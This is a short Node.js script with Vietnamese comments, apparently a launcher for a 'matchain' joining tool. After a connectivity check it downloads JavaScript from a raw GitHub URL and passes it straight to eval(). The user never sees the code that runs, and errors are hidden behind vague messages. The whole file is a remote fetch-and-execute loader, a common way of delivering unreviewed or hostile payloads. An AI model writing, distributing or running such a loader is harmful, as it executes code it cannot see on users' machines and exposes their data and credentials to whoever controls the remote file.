const https = require('https');
const chalk = require('chalk');

// URL chứa mã nguồn Node.js
const url = 'https://raw.githubusercontent.com/Pocodeonline/Pocodeonline/main/matchainjoinkey.js';

// Hàm kiểm tra kết nối mạng
function checkNetworkConnection(callback) {
    https.get('https://www.google.com', (res) => {
        if (res.statusCode === 200) {
            callback(true);
        } else {
            callback(false);
        }
    }).on('error', () => {
        callback(false);
    });
}

// Hàm tải mã nguồn từ URL và thực thi nó
function runCodeFromUrl(url) {
    https.get(url, (res) => {
        let data = '';

        // Nhận dữ liệu từ response
        res.on('data', (chunk) => {
            data += chunk;
        });

        // Khi nhận được toàn bộ dữ liệu, thực thi mã nguồn
        res.on('end', () => {
            try {
                console.log(chalk.green('Đang vào sever matchain...'));
                // Thực thi mã nguồn trực tiếp
                eval(data);
            } catch (err) {
                console.error(chalk.red(`Lỗi...`));
            }
        });

    }).on('error', (err) => {
        console.error(chalk.red(`Lỗi ...`));
    });
}

// Kiểm tra kết nối mạng trước khi tải mã nguồn
checkNetworkConnection((connected) => {
    if (connected) {
        runCodeFromUrl(url);
    } else {
        console.error(chalk.red('Không có kết nối mạng bạn ơi..bật mạng đê?'));
    }
});
